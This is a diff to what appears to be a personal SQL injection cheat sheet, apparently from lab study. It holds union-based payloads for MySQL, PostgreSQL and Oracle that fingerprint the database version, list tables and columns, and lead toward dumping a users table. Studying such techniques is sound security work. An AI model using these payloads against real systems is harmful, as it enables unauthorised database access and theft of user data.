@@ -13,19 +13,20 @@ enum until it shows error so how many columns are the number before error (for e
 
 ' union select version(),2 --+- (mysql)
 ' union select version(),null --+- (postgre)
-' union select banner,null from v$version--+-
+' union select banner,null from v$version--+- (oracle)
 
 # 4. dump all tables
 
-' UNION SELECT table_name,NULL FROM all_tables-- (postgre)
+' UNION SELECT table_name,NULL FROM all_tables-- (oracle)
 
 ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- (mysql)
+' UNION SELECT table_name,NULL FROM information_schema.tables-- (postgre)
 
 # 5. read specific table structure
 
 ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='USERS_FGOOHN' AND table_schema=database()-- (mysql)
-
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_FGOOHN'-- (oracle)
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_fgoohn'--
 
 # 6. dump all data from specific columns
 as example u retrived USERS_FGOOHN table which saves all users information.
